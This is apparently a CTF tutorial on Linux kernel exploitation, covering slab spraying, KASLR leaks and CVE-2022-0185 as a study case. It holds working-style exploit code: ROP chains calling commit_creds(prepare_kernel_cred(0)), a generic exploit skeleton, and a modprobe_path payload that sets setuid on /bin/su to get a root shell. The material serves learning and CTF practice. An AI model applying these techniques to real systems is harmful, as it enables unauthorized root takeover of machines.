# Kernel Pwn

## Setting Up the Environment

A typical kernel challenge package:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu launch script
└── (.config)        # build configuration, optional
```

### Unpacking initramfs and Modifying the init Script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or, for the newc format:
# cpio -idm < ../initramfs.cpio

# Modify init to get root (for CTF practice; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the user-switching line

# Repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extracting vmlinux (if only bzImage is provided)

```bash
# Use the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU Launch Parameter Template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # opens gdb port 1234
```

Protections corresponding to key parameters:

| Parameter | Meaning | Impact on Exploitation |
|------|------|---------|
| `+smep` | Kernel mode cannot execute user-mode code | Must use ROP; cannot jump to user-mode shellcode |
| `+smap` | Kernel mode cannot access user-mode data | The ROP chain cannot live in user mode; put it in kernel mode (heap spray / msgsnd) |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disables KASLR | Function addresses are fixed |
| `kaslr` | Enables KASLR | Must leak |
| `pti=on` | KPTI (Meltdown mitigation) | Returning to user mode requires swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# Terminal 1
./run.sh   # with -s

# Terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, the bata24-maintained fork is recommended; it has dedicated pretty-printers for kernel structs.

## Vulnerability Type Triage

| Vulnerability | Typical Origin | Exploitation Baseline |
|------|---------|---------|
| Kernel stack overflow | copy_from_user with controllable length | Stack canary + KASLR → ROP |
| Kernel heap overflow | kmalloc slab out-of-bounds write | Slab spray + overwrite adjacent object |
| UAF | refcount bug / double free | Re-allocate the same slab → control the freed object |
| Integer overflow | size calculation overflow → small allocation, large copy | Effectively an overflow, same as above |
| TOCTOU | user-space pointer dereferenced twice | userfaultfd / FUSE to stall time |
| race | two threads issuing ioctl simultaneously | Nail the timing window |
| Arbitrary read/write | already the ultimate primitive | Directly modify cred / modprobe_path |

## Slab Spraying (Core of Kernel Heap Pwn)

Spray kernel objects of controllable size into the vulnerable slab to overwrite the target object.

| Slab Size | Spray Object | Advantages |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | Has function pointers; overwriting one gives IP control |
| kmalloc-1024 | `tty_struct` | Has an ops pointer; beautifully structured |
| kmalloc-4096 | `pipe_buffer` | The mainstay of the modern era, still works on 6.x |
| Any size | `msg_msg` | Controllable size (8 - 4096+), sysv msgsnd controls the data |
| kmalloc-128 | `user_key_payload` | keyctl family of interfaces |

### msg_msg Spray Example

```c
// Triggered from user mode
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the 0x30 msg_msg header = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger the vulnerability to overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see if it was modified → leak
```

## Privilege Escalation Paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and universal. Precondition: RIP control (stack overflow / vtable hijack).

```c
// User-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → returns root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, the mov below will overwrite it */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // transfer rax→rdi (some builds need a dedicated gadget)
    commit_creds,                     // set current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // user-mode return function (saved cs/ss)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find them in vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Before returning to user mode you must save cs/ss/rflags/rsp:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Change modprobe_path to /tmp/x (the easiest route)

```text
Principle:
  - The kernel global variable modprobe_path defaults to "/sbin/modprobe"
  - When execve hits a file with an unrecognized magic, the kernel runs modprobe_path as root
  - Change it to "/tmp/x", write /tmp/x (chmod +x), then trigger the unknown-magic execution

Applicable when: you have an arbitrary write primitive but not necessarily ROP
```

```c
// 1. Prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Vulnerability write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// The kernel runs /tmp/x as root, performing chmod +s /bin/su

// 5. Exploit setuid
system("/bin/su");
```

**Source of the modprobe_path address**: the symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it gets invoked when a process crashes
Downside: requires triggering a coredump; clunkier than modprobe_path
```

### 4. Kernel ROP to Disable SMEP/SMAP

If you simply want to jump back to user-mode shellcode (for learning purposes), you can ROP-clear the cr4 bits:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// After clearing SMEP+SMAP, jmp to user-mode shellcode will work
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
    0,
    user_shellcode_addr,    // jump there (this step fails if SMEP is not yet off)
};
```

In practice, **real exploits basically never take this path** — the direct commit_creds ROP is shorter and more stable.

## KASLR Leak Channels

| Source | Restriction | Notes |
|------|------|------|
| /proc/kallsyms | real addresses only when `kptr_restrict=0` | Often open in CTFs |
| /sys/module/.../sections/.text | same as above | Module base |
| dmesg | readable only when `dmesg_restrict=0` | oops output leaks addresses |
| Uninitialized kernel stack read | the vulnerability itself must allow arbitrary reads | Leftover addresses |
| msg_msg + vulnerability leak | OOB read after spraying | Generic |
| Side channels (Meltdown/Spectre) | KPTI fixed Meltdown | Not generic |
| SIDT/SGDT user-mode instructions | old kernels may leak | Basically sealed off in modern kernels |

```c
// Classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // offset per vmlinux
```

## Complete Exploit Template (user mode + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — generic skeleton for kernel pwn
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hardcode directly when nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. Leak KASLR base (assume /proc/kallsyms is readable here, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Build the ROP chain (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp, can point high into the mmap
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability so kernel RIP jumps to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge-specific: ioctl / write / read

    return 0;
}
```

## Learning Reference: CVE-2022-0185

```text
Vulnerability: signed/unsigned confusion in the length calculation of legacy_parse_param in fs/fs_context.c
              → kmalloc heap buffer overflow, arbitrary size, arbitrary data

Why it is a good learning sample:
1. No root needed to trigger (unprivileged user namespace)
2. Overflow size fully controllable
3. Public complete writeup + PoC
4. Combines: user_ns exploitation, msg_msg spraying, UAF re-occupation, cross-cache exploitation

Learning path:
1. Compile a kernel with CONFIG_USER_NS=y
2. Run the Crusaders of Rust original PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read willsroot.io's official writeup (the version carried by PortSwigger)
4. Rewrite it manually: convert the msg_msg spray into a pipe_buffer spray version (practice a different slab path)
5. Add a KASLR leak (the original uses /proc/kallsyms; the challenge version disables it, switch to an OOB read)
```

Main technical points mapped to sections of this document:

- Vulnerability type → "Kernel heap overflow"
- Spray object → "msg_msg spray"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Caveats

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomizes the kernel stack base offset by 0-1023 on every syscall, affecting all exploits that rely on fixed stack offsets
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes in-slab object allocation, lowering spray success rates — spray more
- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path read-only via `static_usermodehelper_path`, defeating the modprobe attack
- **KPTI** separates user/kernel page tables; returning to user mode must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline — no direct swapgs+iretq
- **FG-KASLR** (function-granular KASLR) randomizes at function granularity; you must leak multiple symbols to derive each function's offset
- **CET / IBT** (Intel control-flow enforcement) requires indirect jumps to land on ENDBR instructions, invalidating some gadgets
- **Do not call printk in the kernel for test output** — serial IO changes timing and breaks races; debug with a magic register value (rcx=0xdeadbeef) + a gdb watchpoint instead
